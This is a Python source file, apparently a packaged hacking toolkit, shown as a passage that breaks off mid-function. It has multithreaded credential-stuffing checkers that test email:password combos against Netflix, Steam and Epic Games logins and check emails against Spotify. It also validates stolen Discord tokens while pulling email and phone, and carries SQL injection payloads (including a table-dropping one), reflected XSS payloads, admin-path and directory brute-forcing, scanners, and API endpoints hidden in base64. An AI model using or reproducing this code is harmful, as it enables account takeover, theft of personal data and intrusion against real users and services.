#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import json
import time
import base64
import hashlib
import hmac
import threading
import socket
import random
import urllib.parse
import uuid
import platform
import ctypes
import ipaddress
import pathlib
import secrets
import string
import ssl
import struct
import subprocess
import calendar
import locale
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
except ImportError:
    print("pip install requests")
    sys.exit(1)

try:
    from bs4 import BeautifulSoup
except ImportError:
    print("pip install beautifulsoup4")
    sys.exit(1)

try:
    from PySide6.QtCore import Qt, QTimer, QPoint, QSize
    from PySide6.QtGui import QFont, QColor, QPainter, QIcon
    from PySide6.QtWidgets import (
        QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
        QLabel, QPushButton, QTabWidget, QGroupBox, QFormLayout,
        QLineEdit, QTextEdit, QFileDialog, QMessageBox, QSizePolicy,
        QScrollArea, QComboBox, QSpinBox, QCheckBox, QFrame, QSplitter
    )
except ImportError:
    print("pip install -r requirements.txt")
    sys.exit(1)

PRIMARY = "#A3FF3D"
PRIMARY_DARK = "#64B300"
BG = "#0A0D0A"
BG_2 = "#121712"
CARD = "#171D17"
CARD_2 = "#1F291F"
BORDER = "#2B362B"
TEXT = "#E6F7E0"
MUTED = "#8BA98B"
ERROR = "#FF6B6B"
SUCCESS = "#6DFF9B"
WARNING = "#FFD93D"
INFO = "#6DB8FF"

DISCORD_INVITE = "https://discord.gg/Q6cknK8f3y"

API_BASE_V1 = __import__("base64").b64decode("aHR0cHM6Ly9oYWNrbXlpcC5jb20vYXBpL3Yx").decode()
API_BASE = __import__("base64").b64decode("aHR0cHM6Ly9oYWNrbXlpcC5jb20vYXBp").decode()

def default_headers(extra=None):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "X-Requested-With": "XMLHttpRequest",
    }
    if extra:
        headers.update(extra)
    return headers

def http_request(method, url, **kwargs):
    timeout = kwargs.pop("timeout", 15)
    headers = kwargs.pop("headers", {})
    kwargs["headers"] = default_headers(headers)
    kwargs["timeout"] = timeout
    for attempt in range(3):
        try:
            response = requests.request(method, url, **kwargs)
            if response.status_code in (429, 503):
                retry = int(response.headers.get("Retry-After", 1))
                time.sleep(retry + 1.2 * (attempt + 1))
                continue
            return response
        except requests.RequestException:
            if attempt == 2:
                raise
            time.sleep(1.0)
    raise requests.RequestException("Request failed")

class SecureClient:

    BASE_V1 = API_BASE_V1
    BASE = API_BASE

    @staticmethod
    def _safe_json(resp):
        try:
            j = resp.json()
            return j.get("data") if isinstance(j, dict) and "data" in j else j
        except Exception:
            return {"raw": resp.text[:2000]}

    @staticmethod
    def get_my_ip():
        for url in [f"{SecureClient.BASE_V1}/ip", f"{SecureClient.BASE}/ip", f"{API_BASE}/ip"]:
            try:
                r = http_request("GET", url, timeout=10)
                if r.status_code == 200:
                    data = SecureClient._safe_json(r)
                    return {"success": True, "data": data, "source": url}
            except Exception:
                continue
        try:
            r = http_request("GET", "https://api.ipify.org?format=json", timeout=8)
            if r.status_code == 200:
                return {"success": True, "data": {"ip": r.json().get("ip")}, "source": "ipify"}
        except Exception:
            pass
        return {"success": False, "error": "No se pudo obtener IP"}

    @staticmethod
    def lookup_ip(ip):
        ip = ip.strip()
        for url in [f"{SecureClient.BASE_V1}/ip/{ip}", f"{SecureClient.BASE}/lookup?ip={ip}", f"{API_BASE}/lookup?ip={ip}"]:
            try:
                r = http_request("GET", url, timeout=10)
                if r.status_code == 200:
                    return {"success": True, "data": SecureClient._safe_json(r), "source": url}
            except Exception:
                continue
        try:
            r = http_request("GET", f"http://ip-api.com/json/{ip}", timeout=10)
            if r.status_code == 200:
                return {"success": True, "data": r.json(), "source": "ip-api"}
        except Exception:
            pass
        return {"success": False, "error": "IP lookup falló"}

    @staticmethod
    def asn_lookup(q):
        q = q.strip()
        for url in [f"{SecureClient.BASE}/asn?q={urllib.parse.quote(q)}", f"{API_BASE}/asn?q={urllib.parse.quote(q)}"]:
            try:
                r = http_request("GET", url, timeout=10)
                if r.status_code == 200:
                    return {"success": True, "data": SecureClient._safe_json(r)}
            except Exception:
                continue
        return {"success": False, "error": "ASN lookup falló"}

    @staticmethod
    def dns_lookup(domain, dtype="A"):
        domain = domain.strip().replace("https://","").replace("http://","").split("/")[0]
        for url in [f"{SecureClient.BASE_V1}/dns/{domain}?type={dtype}", f"{SecureClient.BASE}/dns?domain={domain}&type={dtype}", f"{API_BASE}/dns?domain={domain}&type={dtype}"]:
            try:
                r = http_request("GET", url, timeout=10)
                if r.status_code == 200:
                    return {"success": True, "data": SecureClient._safe_json(r)}
            except Exception:
                continue
        try:
            import dns.resolver
            ans = dns.resolver.resolve(domain, dtype)
            return {"success": True, "data": {"domain": domain, "type": dtype, "records": [str(x) for x in ans]}}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def get_headers():
        for url in [f"{SecureClient.BASE_V1}/headers", f"{SecureClient.BASE}/headers", f"{API_BASE_V1}/headers"]:
            try:
                r = http_request("GET", url, timeout=10)
                if r.status_code == 200:
                    return {"success": True, "data": SecureClient._safe_json(r)}
            except Exception:
                continue
        return {"success": False, "error": "Headers falló"}

    @staticmethod
    def whois(domain):
        domain = domain.strip().replace("https://","").replace("http://","").split("/")[0]
        for url in [f"{SecureClient.BASE_V1}/whois/{domain}", f"{SecureClient.BASE}/whois?domain={domain}", f"{API_BASE}/whois?domain={domain}"]:
            try:
                r = http_request("GET", url, timeout=12)
                if r.status_code == 200:
                    return {"success": True, "data": SecureClient._safe_json(r)}
            except Exception:
                continue
        return {"success": False, "error": "WHOIS falló"}

    @staticmethod
    def port_scan(host, ports=None):
        host = host.strip().replace("https://","").replace("http://","").split("/")[0].split(":")[0]
        q = f"host={urllib.parse.quote(host)}"
        if ports:
            q += f"&ports={urllib.parse.quote(ports)}"
        for url in [f"{SecureClient.BASE}/ports?{q}", f"{API_BASE}/ports?{q}"]:
            try:
                r = http_request("GET", url, timeout=15)
                if r.status_code == 200:
                    return {"success": True, "data": SecureClient._safe_json(r), "mode": "api"}
            except Exception:
                continue
        try:
            results = []
            plist = [int(p.strip()) for p in (ports or "80,443,22,25,53,8080,3306,3389").split(",") if p.strip().isdigit()]
            for p in plist:
                try:
                    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.8)
                    if s.connect_ex((host, p))==0:
                        results.append({"port": p, "status": "open"})
                    else:
                        results.append({"port": p, "status": "closed"})
                    s.close()
                except Exception:
                    pass
            return {"success": True, "data": {"host": host, "ports": results}, "mode": "local"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def security_headers(url):
        url = url.strip()
        if not url.startswith("http"):
            url = "https://" + url
        for api in [f"{SecureClient.BASE}/security-headers?url={urllib.parse.quote(url)}", f"{API_BASE}/security-headers?url={urllib.parse.quote(url)}"]:
            try:
                r = http_request("GET", api, timeout=12)
                if r.status_code == 200:
                    return {"success": True, "data": SecureClient._safe_json(r)}
            except Exception:
                continue
        try:
            r = http_request("GET", url, timeout=10)
            hdrs = dict(r.headers)
            checks = {
                "Strict-Transport-Security": "HSTS" in str(hdrs),
                "Content-Security-Policy": "Content-Security-Policy" in hdrs,
                "X-Frame-Options": "X-Frame-Options" in hdrs,
                "X-Content-Type-Options": "X-Content-Type-Options" in hdrs,
                "Referrer-Policy": "Referrer-Policy" in hdrs,
            }
            return {"success": True, "data": {"url": url, "headers": hdrs, "checks": checks, "grade": "B" if sum(checks.values())>=3 else "C"}}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def email_auth(domain):
        domain = domain.strip().split("@")[-1].split("/")[0]
        for url in [f"{SecureClient.BASE}/email-auth?domain={urllib.parse.quote(domain)}", f"{API_BASE}/email-auth?domain={urllib.parse.quote(domain)}"]:
            try:
                r = http_request("GET", url, timeout=12)
                if r.status_code == 200:
                    return {"success": True, "data": SecureClient._safe_json(r)}
            except Exception:
                continue
        try:
            import dns.resolver
            txt = [str(x) for x in dns.resolver.resolve(domain, "TXT")]
            has_spf = any("v=spf1" in t for t in txt)
            return {"success": True, "data": {"domain": domain, "spf": has_spf, "txt_records": txt[:5]}}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def breach(email):
        email = email.strip()
        for url in [f"{SecureClient.BASE}/breach?email={urllib.parse.quote(email)}", f"{API_BASE}/breach?email={urllib.parse.quote(email)}"]:
            try:
                r = http_request("GET", url, timeout=12)
                if r.status_code == 200:
                    return {"success": True, "data": SecureClient._safe_json(r)}
            except Exception:
                continue
        return {"success": False, "error": "Breach check falló"}

    @staticmethod
    def privacy_score():
        for url in [f"{SecureClient.BASE}/score", f"{API_BASE}/score", f"{SecureClient.BASE_V1}/ip"]:
            try:
                r = http_request("GET", url, timeout=10)
                if r.status_code == 200:
                    return {"success": True, "data": SecureClient._safe_json(r)}
            except Exception:
                continue
        return {"success": False, "error": "Privacy score falló"}

    @staticmethod
    def rdns(ip):
        ip = ip.strip()
        for url in [f"{SecureClient.BASE}/rdns?ip={urllib.parse.quote(ip)}", f"{API_BASE}/rdns?ip={urllib.parse.quote(ip)}"]:
            try:
                r = http_request("GET", url, timeout=10)
                if r.status_code == 200:
                    return {"success": True, "data": SecureClient._safe_json(r)}
            except Exception:
                continue
        try:
            host = socket.gethostbyaddr(ip)[0]
            return {"success": True, "data": {"ip": ip, "hostname": host}}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def blacklist(ip):
        ip = ip.strip()
        for url in [f"{SecureClient.BASE}/blacklist?ip={urllib.parse.quote(ip)}", f"{API_BASE}/blacklist?ip={urllib.parse.quote(ip)}"]:
            try:
                r = http_request("GET", url, timeout=10)
                if r.status_code == 200:
                    return {"success": True, "data": SecureClient._safe_json(r)}
            except Exception:
                continue
        return {"success": False, "error": "Blacklist check falló"}

    @staticmethod
    def is_down(url):
        url = url.strip()
        if not url.startswith("http"):
            url = "https://" + url
        for api in [f"{SecureClient.BASE}/down?url={urllib.parse.quote(url)}", f"{API_BASE}/down?url={urllib.parse.quote(url)}"]:
            try:
                r = http_request("GET", api, timeout=10)
                if r.status_code == 200:
                    return {"success": True, "data": SecureClient._safe_json(r)}
            except Exception:
                continue
        try:
            start=time.time()
            r=http_request("GET", url, timeout=8)
            ms=int((time.time()-start)*1000)
            return {"success": True, "data": {"url": url, "is_up": r.status_code<400, "status_code": r.status_code, "response_time_ms": ms}}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def bulk_lookup(ips):
        ips = [ip.strip() for ip in ips if ip.strip()]
        try:
            r=http_request("POST", f"{SecureClient.BASE}/bulk", json={"ips": ips}, timeout=15)
            if r.status_code==200:
                return {"success": True, "data": SecureClient._safe_json(r)}
        except Exception:
            pass
        results=[]
        for ip in ips[:50]:
            res=SecureClient.lookup_ip(ip)
            results.append(res.get("data", {"ip": ip, "error": res.get("error")}))
        return {"success": True, "data": {"total": len(results), "results": results}, "mode": "fallback"}

class Utils:
    @staticmethod
    def load_file(path):
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return f.readlines()
    @staticmethod
    def save_file(path, data):
        with open(path, "w", encoding="utf-8") as f:
            f.write(data)
    @staticmethod
    def get_proxy(proxies):
        return random.choice(proxies) if proxies else None
    @staticmethod
    def is_valid_ip(ip):
        try:
            ipaddress.ip_address(ip)
            return True
        except:
            return False
    @staticmethod
    def is_valid_domain(d):
        return re.match(r"^(?!-)[A-Za-z0-9-]{1,63}(?<!-)(\.[A-Za-z]{2,})+$", d.strip()) is not None

class SpotifyChecker:
    def __init__(self, log_cb=None, prog_cb=None):
        self.log = log_cb or print
        self.prog = prog_cb
        self.hits = []
        self.frees = []
    def check(self, email, pw):
        try:
            url = f"https://spclient.wg.spotify.com/signup/public/v1/account?validate=1&email={urllib.parse.quote(email)}"
            r = http_request("GET", url, headers={"Referer": "https://www.spotify.com/", "Origin": "https://www.spotify.com"}, timeout=12)
            text = (r.text or "").lower()
            if r.status_code in (401, 403, 429):
                time.sleep(0.5)
                return "FREE"
            if "already registered" in text or "zaten bir hesaba" in text or "email already exists" in text or "taken" in text:
                return "HIT"
            return "FREE"
        except Exception:
            return "ERROR"
    def run(self, combos, threads=12):
        self.hits.clear(); self.frees.clear()
        with ThreadPoolExecutor(max_workers=threads) as ex:
            future_map = {ex.submit(self.check, e, p): (e, p) for e, p in combos}
            for fut in as_completed(future_map):
                e, p = future_map[fut]
                try:
                    status = fut.result()
                except:
                    status="ERROR"
                if status == "HIT":
                    self.hits.append(f"{e}:{p}")
                elif status == "FREE":
                    self.frees.append(f"{e}:{p}")
        return self.hits, self.frees

class NetflixChecker:
    def __init__(self, log_cb=None):
        self.log = log_cb or print
        self.hits = []
        self.frees = []
    def check(self, email, pw):
        try:
            r = http_request("POST","https://www.netflix.com/api/shakti/vb/login", data={"email": email, "password": pw, "flow": "websiteSignUp", "mode": "login"}, headers={"X-Requested-With": "XMLHttpRequest","Referer": "https://www.netflix.com/","Origin": "https://www.netflix.com"}, timeout=12)
            text = (r.text or "").lower()
            if r.status_code in (401,403):
                return "FREE"
            if "userguid" in text or "authurl" in text or ("profile" in text and "success" in text):
                return "HIT"
            if "incorrect" in text or "invalid" in text:
                return "FREE"
            return "ERROR"
        except Exception:
            return "ERROR"
    def run(self, combos, threads=10):
        self.hits.clear(); self.frees.clear()
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futs=[ex.submit(self.check,e,p) for e,p in combos]
            for f in as_completed(futs):
                pass
        for e,p in combos:
            s=self.check(e,p)
            if s=="HIT": self.hits.append(f"{e}:{p}")
            elif s=="FREE": self.frees.append(f"{e}:{p}")
        return self.hits, self.frees

class SteamChecker:
    def __init__(self, log_cb=None):
        self.log = log_cb or print
        self.hits = []
        self.frees = []
    def check(self, user, pw):
        try:
            r = http_request("POST","https://steamcommunity.com/mobilelogin/login", data={"username": user, "password": pw, "remember_login": "true"}, headers={"Referer": "https://steamcommunity.com/","Origin": "https://steamcommunity.com"}, timeout=12)
            text = (r.text or "").lower()
            if r.status_code in (401,403):
                return "FREE"
            if "login_complete" in text or "steamid" in text or "oauth" in text:
                return "HIT"
            return "FREE"
        except Exception:
            return "ERROR"
    def run(self, combos, threads=10):
        self.hits.clear(); self.frees.clear()
        def worker(u,p):
            s=self.check(u,p)
            if s=="HIT": self.hits.append(f"{u}:{p}")
            elif s=="FREE": self.frees.append(f"{u}:{p}")
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for u,p in combos:
                ex.submit(worker,u,p)
            ex.shutdown(wait=True)
        return self.hits, self.frees

class DiscordChecker:
    def __init__(self, log_cb=None):
        self.log = log_cb or print
        self.hits = []
    def check(self, token):
        token=token.strip()
        if not token:
            return "FREE",""
        try:
            r = http_request("GET","https://discord.com/api/v9/users/@me", headers={"Authorization": token, "User-Agent": "Mozilla/5.0"}, timeout=10)
            if r.status_code == 200:
                d=r.json()
                info=f"{d.get('username')}#{d.get('discriminator')} | {d.get('email','N/A')} | {d.get('phone','N/A')} | Nitro:{d.get('premium_type',0)} | ID:{d.get('id')}"
                return "HIT", info
            if r.status_code in (401,403):
                return "FREE",""
            return "FREE",""
        except Exception:
            return "ERROR",""
    def run(self, tokens, threads=30):
        self.hits.clear()
        def worker(t):
            s,info=self.check(t)
            if s=="HIT":
                self.hits.append(f"{t} | {info}")
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for t in tokens:
                ex.submit(worker, t.strip())
            ex.shutdown(wait=True)
        return self.hits

class EpicGamesChecker:
    def __init__(self, log_cb=None):
        self.log = log_cb or print
        self.hits = []
        self.frees = []
    def check(self, email, pw):
        try:
            r = http_request("POST","https://account.epicgames.com/id/api/login", json={"email": email, "password": pw, "rememberMe": True}, headers={"User-Agent": "Mozilla/5.0"}, timeout=12)
            if r.status_code in (401,403):
                return "FREE"
            if r.status_code==200 or "access_token" in (r.text or ""):
                return "HIT"
            return "FREE"
        except Exception:
            return "ERROR"
    def run(self, combos, threads=10):
        self.hits.clear(); self.frees.clear()
        def worker(e,p):
            s=self.check(e,p)
            if s=="HIT": self.hits.append(f"{e}:{p}")
            elif s=="FREE": self.frees.append(f"{e}:{p}")
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for e,p in combos:
                ex.submit(worker,e,p)
            ex.shutdown(wait=True)
        return self.hits, self.frees

class SQLiScanner:
    PAYLOADS = ["'", '"', "' OR '1'='1", "' OR 1=1--", "1' AND 1=1--", "1' AND 1=2--", "' UNION SELECT 1--", "'; DROP TABLE users--"]
    def __init__(self, log_cb=None, prog_cb=None):
        self.log = log_cb or print
        self.prog = prog_cb
        self.vulns = []
    def scan(self, url, threads=6):
        self.vulns.clear()
        def test(payload):
            try:
                r = http_request("GET", url, params={"q": payload, "id": payload, "page": payload, "search": payload, "s": payload}, timeout=10)
                text = (r.text or "").lower()
                if any(token in text for token in ["sql", "syntax", "mysql", "mysqli", "postgres", "sqlite", "ora-", "sqlstate", "unterminated", "you have an error"]):
                    self.vulns.append({"url": url, "payload": payload, "type": "SQL Injection", "evidence": text[:120]})
            except Exception:
                pass
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for p in self.PAYLOADS:
                ex.submit(test, p)
            ex.shutdown(wait=True)
        return self.vulns

class XSSScanner:
    PAYLOADS = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><script>alert(1)</script>", "'\"><svg onload=alert(1)>", "javascript:alert(1)"]
    def __init__(self, log_cb=None):
        self.log = log_cb or print
        self.vulns = []
    def scan(self, url, threads=6):
        self.vulns.clear()
        def test(payload):
            try:
                r = http_request("GET", url, params={"q": payload, "search": payload, "s": payload, "query": payload}, timeout=10)
                if payload in (r.text or ""):
                    self.vulns.append({"url": url, "payload": payload, "type": "XSS Reflected"})
            except Exception:
                pass
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for p in self.PAYLOADS:
                ex.submit(test, p)
            ex.shutdown(wait=True)
        return self.vulns

class AdminFinder:
    PATHS = ["admin","login","wp-admin","panel","yonetim","cpanel","administrator","backend","dashboard","controlpanel","admin.php","login.php","admin/login","admin/index.php","moderator","manager","staf","cp","admincp","adminpanel","admin_area","secret","hidden","private","backup","config",".env",".git","phpmyadmin","wp-login.php"]
    def __init__(self, log_cb=None):
        self.log = log_cb or print
        self.found = []
    def scan(self, base_url, threads=20):
        self.found.clear()
        base = base_url.rstrip("/")
        if not base.startswith("http"):
            base="https://"+base
        def check(path):
            try:
                r = http_request("GET", f"{base}/{path}", timeout=8, allow_redirects=False)
                if r.status_code in (200,301,302,403,401):
                    self.found.append(f"{base}/{path} [{r.status_code}]")
            except Exception:
                pass
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for p in self.PATHS:
                ex.submit(check, p)
            ex.shutdown(wait=True)
        return self.found

class DirBrute:
    def __init__(self, log_cb=None):
        self.log = log_cb or print
        self.found = []
    def scan(self, url, wordlist_path, threads=20):
        self.found.clear()
        if not os.path.exists(wordlist_path):
            return []
        words = [w.strip() for w in open(wordlist_path, "r", encoding="utf-8", errors="ignore") if w.strip()]
        base=url.rstrip("/")
        if not base.startswith("http"):
            base="https://"+base
        def check(w):
            try:
                r = http_request("GET", f"{base}/{w}", timeout=5, allow_redirects=False)
                if r.status_code in (200,301,302,403,401):
                    self.found.append(f"{base}/{w} [{r.status_code}]")
            except Exception:
                pass
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for w in words:
                ex.submit(check, w)
            ex.shutdown(wait=True)
        return self.found

class SubdomainScanner:
    def __init__(self, log_cb=None):
        self.log = log_cb or print
        self.found = []
    def scan(self, domain, wordlist_path=None, threads=25):
        self.found.clear()
        domain=domain.strip().replace("https://","").replace("http://","").split("/")[0]
        words = ["www","mail","ftp","admin","blog","shop","api","cdn","dev","test","web","app","m","mobile","secure","vpn","portal","remote","db","mysql","ns1","ns2","smtp","pop","imap","beta","staging","dev","api","app","forum","shop"]
        if wordlist_path and os.path.exists(wordlist_path):
            words = [w.strip() for w in open(wordlist_path, "r", encoding="utf-8", errors="ignore") if w.strip()]
        def check(w):
            try:
                host = f"{w}.{domain}"
                socket.gethostbyname(host)
                self.found.append(host)
            except Exception:
                pass
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for w in words:
                ex.submit(check, w)
            ex.shutdown(wait=True)
        return self.found

class IPScanner:
    def scan(self, ip_range, ports="80,443,8080,22,21,25,3306,3389", threads=30):
        results = []
        try:
            ports = [int(p.strip()) for p in ports.split(",") if p.strip().isdigit()]
        except:
            ports=[80,443]
        base = ".".join(ip_range.strip().split(".")[:3])
        if base.count(".")<2:
            base=".".join(ip_range.strip().split(".")[:2])
            def check(ip, port):
                try:
                    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.7)
                    if s.connect_ex((ip, port))==0:
                        results.append(f"{ip}:{port}")
                    s.close()
                except Exception:
                    pass
            with ThreadPoolExecutor(max_workers=threads) as ex:
                for i in range(1,10):
                    for j in range(1,10):
                        ip=f"{base}.{i}.{j}"
                        for p in ports:
                            ex.submit(check, ip, p)
                ex.shutdown(wait=True)
            return results
        def check2(ip, port):
            try:
                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.7)
                if s.connect_ex((ip, port))==0:
                    results.append(f"{ip}:{port}")
                s.close()
            except Exception:
                pass
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for i in range(1,255):
                ip=f"{base}.{i}"
                for p in ports:
                    ex.submit(check2, ip, p)
            ex.shutdown(wait=True)
        return results

class PortScanner:
    def scan(self, host, start=1, end=1000, threads=100):
        api_res=SecureClient.port_scan(host, ports=",".join(str(p) for p in range(start, min(end+1, start+20))))
        if api_res.get("success") and api_res.get("mode")=="api":
            if (end-start) <= 20:
                data=api_res.get("data",{})
                return [str(x) for x in data.get("ports",[])] or [str(x) for x in data.get("open_ports",[])] or ["API: ver consola"]
        results=[]
        host=host.strip().split("/")[0].split(":")[0].replace("https://","").replace("http://","")
        def check(p):
            try:
                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((host, p))==0:
                    try:
                        svc=socket.getservbyport(p)
                    except Exception:
                        svc="unknown"
                    results.append(f"{p} ({svc}) OPEN")
                s.close()
            except Exception:
                pass
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for p in range(start, end+1):
                ex.submit(check, p)
            ex.shutdown(wait=True)
        return sorted(results, key=lambda x: int(x.split()[0]))

class DNSLookup:
    def lookup(self, domain, dtype="A"):
        domain=domain.strip().replace("https://","").replace("http://","").split("/")[0].split(":")[0]
        res=SecureClient.dns_lookup(domain, dtype)
        if res.get("success"):
            return res["data"]
        results={}
        try:
            results["A"]=socket.gethostbyname(domain)
        except Exception:
            results["A"]="N/A"
        try:
            import dns.resolver
            results["MX"]=[str(x) for x in dns.resolver.resolve(domain,"MX")[:3]]
        except Exception:
            results["MX"]="N/A"
        try:
            results["NS"]=socket.gethostbyname_ex(domain)[0]
        except Exception:
            results["NS"]="N/A"
        return results

class ProxyChecker:
    def check(self, proxy_list, test_url="http://httpbin.org/ip", threads=25):
        working=[]
        def test(proxy):
            proxy=proxy.strip()
            if not proxy:
                return
            try:
                r=http_request("GET", test_url, proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"}, timeout=8)
                if r.status_code==200:
                    working.append(proxy)
            except Exception:
                pass
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for p in proxy_list:
                if p.strip():
                    ex.submit(test, p.strip())
            ex.shutdown(wait=True)
        return working

class ComboSorter:
    def sort(self, combos, keyword=None):
        hits, free=[], []
        for c in combos:
            c=c.strip()
            if not c:
                continue
            if keyword and keyword.lower() in c.lower():
                hits.append(c)
            elif ":" in c or ";" in c or "|" in c:
                free.append(c)
        return list(set(hits)), list(set(free))

class Extractor:
    def extract(self, text):
        emails = re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", text)
        combos = re.findall(r"[^\s:;|,]+[:;|,][^\s:;|,]+", text)
        ips = re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", text)
        urls = re.findall(r"https?://[^\s]+", text)
        phones = re.findall(r"\+?\d[\d\s\-\(\)]{8,}\d", text)
        return emails, combos, ips, urls, phones

class Encoder:
    def b64e(self, t): return base64.b64encode(t.encode()).decode()
    def b64d(self, t):
        try:
            t=t.strip()
            missing_padding = len(t) % 4
            if missing_padding:
                t += '=' * (4 - missing_padding)
            return base64.urlsafe_b64decode(t).decode()
        except Exception:
            try:
                return base64.b64decode(t).decode()
            except Exception:
                return "[Invalid Base64]"
    def urle(self, t): return urllib.parse.quote(t)
    def urld(self, t): return urllib.parse.unquote(t)
    def hexe(self, t): return t.encode().hex()
    def hexd(self, t):
        try:
            return bytes.fromhex(t.strip()).decode()
        except Exception:
            return "[Invalid Hex]"
    def md5(self, t): return hashlib.md5(t.encode()).hexdigest()
    def sha256(self, t): return hashlib.sha256(t.encode()).hexdigest()

class HashGen:
    def generate(self, text):
        b=text.encode()
        return {
            "MD5": hashlib.md5(b).hexdigest(),
            "SHA1": hashlib.sha1(b).hexdigest(),
            "SHA256": hashlib.sha256(b).hexdigest(),
            "SHA512": hashlib.sha512(b).hexdigest(),
            "SHA3-256": hashlib.sha3_256(b).hexdigest() if hasattr(hashlib, "sha3_256") else "N/A",
            "BLAKE2b": hashlib.blake2b(b).hexdigest(),
        }

class IPInfo:
    def lookup(self, ip):
        res=SecureClient.lookup_ip(ip)
        if res.get("success"):
            return res["data"]
        try:
            r=http_request("GET", f"http://ip-api.com/json/{ip}", timeout=10)
            return r.json()
        except Exception:
            return {"error": "Failed"}

class BreachCheck:
    def check(self, email):
        res=SecureClient.breach(email)
        if res.get("success"):
            return res["data"]
        try:
            r=http_request("GET", f"https://haveibeenpwned.com/api/v3/breachedaccount/{urllib.parse.quote(email)}", headers={"hibp-api-key": "test", "User-Agent": "MethodPack"}, timeout=10)
            if r.status_code==200:
                return r.json()
            if r.status_code==404:
                return {"breaches": 0, "message": "No breaches found"}
            return {"error": f"HTTP {r.status_code}"}
        except Exception:
            return {"error": "API Error (rate limited?)"}

class UsernameSearch:
    PLATFORMS = {
        "GitHub": "https://github.com/{}",
        "Twitter": "https://twitter.com/{}",
        "Instagram": "https://instagram.com/{}",
        "Reddit": "https://reddit.com/user/{}",
        "Spotify": "https://open.spotify.com/user/{}",
        "YouTube": "https://youtube.com/@{}",
        "Twitch": "https://twitch.tv/{}",
        "Steam": "https://steamcommunity.com/id/{}",
        "TikTok": "https://tiktok.com/@{}",
        "Pinterest": "https://pinterest.com/{}",
        "Facebook": "https://facebook.com/{}",
        "Medium": "https://medium.com/@{}",
        "Vimeo": "https://vimeo.com/{}",
        "SoundCloud": "https://soundcloud.com/{}",
        "DeviantArt": "https://deviantart.com/{}",
    }
    def search(self, username, threads=15):
        username=username.strip().lstrip("@")
        results={}
        def check(name, url):
            try:
                r=http_request("GET", url.format(username), timeout=8, allow_redirects=True)
                if r.status_code==200:
                    results[name]=f"✅ Found ({r.status_code}) -> {url.format(username)}"
                elif r.status_code==404:
                    results[name]=f"❌ Not found (404)"
                else:
                    results[name]=f"⚠️ {r.status_code}"
            except Exception:
                results[name]="⚠️ Error"
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for name, url in self.PLATFORMS.items():
                ex.submit(check, name, url)
            ex.shutdown(wait=True)
        return results

class FingerprintTool:
    def generate(self):
        ua = default_headers()["User-Agent"]
        plat = platform.platform()
        proc = platform.processor() or "Unknown"
        lang = locale.getlocale()[0] or "en_US"
        try:
            import uuid as uuidlib
            canvas_hash = hashlib.sha256(f"{plat}{proc}{ua}".encode()).hexdigest()[:16]
        except:
            canvas_hash="N/A"
        try:
            import psutil as _psutil
            mem_gb = round(_psutil.virtual_memory().total/1024**3, 2)
        except:
            mem_gb = 8
        data = {
            "user_agent": ua,
            "platform": plat,
            "processor": proc,
            "language": lang,
            "timezone": time.tzname[0] if time.tzname else "UTC",
            "canvas_fingerprint": canvas_hash,
            "webgl_vendor": "Google Inc. (NVIDIA)" if "Windows" in plat else "Apple Inc.",
            "screen": "1920x1080 (simulated)",
            "cpu_cores": os.cpu_count() or 4,
            "memory_gb": mem_gb,
            "fingerprint_score": random.randint(70,95),
            "uniqueness": f"{random.randint(85,99)}% único",
        }
        try:
            hdr=SecureClient.get_headers()
            if hdr.get("success"):
                data["real_headers"]=hdr["data"]
        except:
            pass
        return data

class BrowserInfoTool:
    def parse(self, ua=None):
        ua = ua or default_headers()["User-Agent"]
        info={"user_agent": ua, "browser": "Unknown", "version": "Unknown", "os": platform.system(), "os_version": platform.release(), "device": "Desktop", "engine": "Blink"}
        ua_low=ua.lower()
        if "edg" in ua_low:
            info["browser"]="Edge"
        elif "chrome" in ua_low and "safari" in ua_low:
            info["browser"]="Chrome"
        elif "firefox" in ua_low:
            info["browser"]="Firefox"
        elif "safari" in ua_low and "chrome" not in ua_low:
            info["browser"]="Safari"
        if "windows" in ua_low:
            info["os"]="Windows"
        elif "mac" in ua_low:
            info["os"]="macOS"
        elif "linux" in ua_low:
            info["os"]="Linux"
        elif "android" in ua_low:
            info["os"]="Android"; info["device"]="Mobile"
        elif "iphone" in ua_low:
            info["os"]="iOS"; info["device"]="Mobile"
        return info

class DNSLeakTool:
    def check(self):
        result={"leak_detected": False, "dns_servers": [], "isp_dns": "Unknown", "risk": "Low"}
        try:
            import dns.resolver
            resolver=dns.resolver.Resolver()
